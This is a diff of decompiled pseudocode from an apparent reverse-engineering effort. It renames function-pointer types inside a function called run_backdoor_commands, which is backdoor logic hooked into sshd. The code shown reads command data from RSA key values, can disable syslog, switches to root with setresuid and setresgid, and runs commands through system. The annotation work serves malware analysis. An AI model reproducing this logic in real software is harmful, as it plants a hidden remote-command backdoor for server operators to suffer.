@@ -15,16 +15,16 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
 {
   imported_funcs_t *piVar1;
   pfn_RSA_get0_key_t ppVar2;
-  _func_39 *p_Var3;
+  pfn_BN_num_bits_t ppVar3;
   libc_imports_t *plVar4;
   sensitive_data *psVar5;
   sshkey **ppsVar6;
   u8 *puVar7;
-  _func_27 *p_Var8;
+  pfn_setlogmask_t ppVar8;
   sshd_ctx_t *psVar9;
   uint *puVar10;
   long *plVar11;
-  _func_19 *p_Var12;
+  pfn_exit_t ppVar12;
   byte bVar13;
   uint uVar14;
   int iVar15;
@@ -112,7 +112,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
     if ((((ctx->disable_backdoor == FALSE) && (key != (RSA *)0x0)) &&
         (piVar1 = ctx->imported_funcs, piVar1 != (imported_funcs_t *)0x0)) &&
        ((ppVar2 = piVar1->RSA_get0_key, ppVar2 != (pfn_RSA_get0_key_t)0x0 &&
-        (piVar1->BN_bn2bin != (_func_58 *)0x0)))) {
+        (piVar1->BN_bn2bin != (pfn_BN_bn2bin_t)0x0)))) {
       if (do_orig == (BOOL *)0x0) {
         ctx->disable_backdoor = TRUE;
         return FALSE;
@@ -121,8 +121,8 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
       (*ppVar2)(key,(BIGNUM **)&tgt_uid,(BIGNUM **)&tgt_gid,(BIGNUM **)0x0);
       if ((((_tgt_uid != (BIGNUM *)0x0) && (_tgt_gid != (BIGNUM *)0x0)) &&
           ((ctx->imported_funcs != (imported_funcs_t *)0x0 &&
-           (((p_Var3 = ctx->imported_funcs->BN_num_bits, p_Var3 != (_func_39 *)0x0 &&
-             (uVar14 = (*p_Var3)(_tgt_uid), uVar14 < 0x4001)) &&
+           (((ppVar3 = ctx->imported_funcs->BN_num_bits, ppVar3 != (pfn_BN_num_bits_t)0x0 &&
+             (uVar14 = (*ppVar3)(_tgt_uid), uVar14 < 0x4001)) &&
             (uVar14 = uVar14 + 7 >> 3, uVar14 - 0x14 < 0x205)))))) &&
          (iVar15 = (*ctx->imported_funcs->BN_bn2bin)(_tgt_uid,local_2e0 + 5), -1 < iVar15)) {
         uVar23 = (ulong)uVar14;
@@ -132,8 +132,8 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
              (uVar29 = (ulong)CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) * (ulong)uStack_2d7 +
                        lStack_2d3, 3 < uVar29)) goto LAB_0010a11a;
           plVar4 = ctx->libc_imports;
-          if (((plVar4 != (libc_imports_t *)0x0) && (plVar4->getuid != (_func_18 *)0x0)) &&
-             ((plVar4->exit != (_func_19 *)0x0 &&
+          if (((plVar4 != (libc_imports_t *)0x0) && (plVar4->getuid != (pfn_getuid_t)0x0)) &&
+             ((plVar4->exit != (pfn_exit_t)0x0 &&
               ((ctx->sshd_log_ctx != (sshd_log_ctx_t *)0x0 && (ctx->num_shifted_bits == 0x1c8))))))
           {
             rsa_e = (BIGNUM *)CONCAT44(uStack_2d7,CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25));
@@ -256,13 +256,13 @@ LAB_00109aa2:
                           if (uVar28 <= uVar23 - uVar38) {
                             if ((((local_2e0[0] & 4) == 0) ||
                                 (ctx->libc_imports == (libc_imports_t *)0x0)) ||
-                               (p_Var8 = ctx->libc_imports->setlogmask, p_Var8 == (_func_27 *)0x0))
-                            {
+                               (ppVar8 = ctx->libc_imports->setlogmask,
+                               ppVar8 == (pfn_setlogmask_t)0x0)) {
                               ctx->sshd_log_ctx->syslog_disabled = FALSE;
                               if ((local_2e0[0] & 5) == 5) goto LAB_0010a1ba;
                             }
                             else {
-                              (*p_Var8)(-0x80000000);
+                              (*ppVar8)(-0x80000000);
                               ctx->sshd_log_ctx->syslog_disabled = TRUE;
                             }
                             uVar18 = (*ctx->libc_imports->getuid)();
@@ -306,9 +306,9 @@ LAB_00109c8a:
                                   if (uVar18 == 0) {
                                     plVar4 = ctx->libc_imports;
                                     if ((((plVar4 != (libc_imports_t *)0x0) &&
-                                         (plVar4->setresgid != (_func_20 *)0x0)) &&
-                                        (plVar4->setresuid != (_func_21 *)0x0)) &&
-                                       (plVar4->system != (_func_22 *)0x0)) {
+                                         (plVar4->setresgid != (pfn_setresgid_t)0x0)) &&
+                                        (plVar4->setresuid != (pfn_setresuid_t)0x0)) &&
+                                       (plVar4->system != (pfn_system_t)0x0)) {
                                       if (uVar29 == 0) {
                                         psVar9 = ctx->sshd_ctx;
                                         if (((psVar9 != (sshd_ctx_t *)0x0) &&
@@ -349,9 +349,9 @@ LAB_00109d36:
                                                   if (((-1 < (int)uStack_5a0) &&
                                                       (plVar4 = ctx->libc_imports,
                                                       plVar4 != (libc_imports_t *)0x0)) &&
-                                                     ((plVar4->pselect != (_func_24 *)0x0 &&
-                                                      (plVar4->__errno_location != (_func_26 *)0x0))
-                                                     )) {
+                                                     ((plVar4->pselect != (pfn_pselect_t)0x0 &&
+                                                      (plVar4->__errno_location !=
+                                                       (pfn___errno_location_t)0x0)))) {
                                                     iVar17 = (int)uStack_5a0 >> 6;
                                                     piVar37 = (int *)(1L << ((byte)uStack_5a0 & 0x3f
                                                                             ));
@@ -496,8 +496,8 @@ LAB_00109fb9:
                                         }
                                       }
                                       else if ((((local_2e0[1] & 0xc0) == 0xc0) &&
-                                               (plVar4->exit != (_func_19 *)0x0)) &&
-                                              (plVar4->pselect != (_func_24 *)0x0)) {
+                                               (plVar4->exit != (pfn_exit_t)0x0)) &&
+                                              (plVar4->pselect != (pfn_pselect_t)0x0)) {
                                         pcStack_548 = (cmd_arguments_t *)0x0;
                                         monitor_reqtype_ptr = (int *)0x5;
                                         (*plVar4->pselect)(0,(fd_set *)0x0,(fd_set *)0x0,
@@ -578,11 +578,11 @@ LAB_0010a1ba:
                           if (ctx->libc_imports == (libc_imports_t *)0x0) {
                             return FALSE;
                           }
-                          p_Var12 = ctx->libc_imports->exit;
-                          if (p_Var12 == (_func_19 *)0x0) {
+                          ppVar12 = ctx->libc_imports->exit;
+                          if (ppVar12 == (pfn_exit_t)0x0) {
                             return FALSE;
                           }
-                          (*p_Var12)(0);
+                          (*ppVar12)(0);
                           return FALSE;
                         }
                         goto LAB_0010a11a;
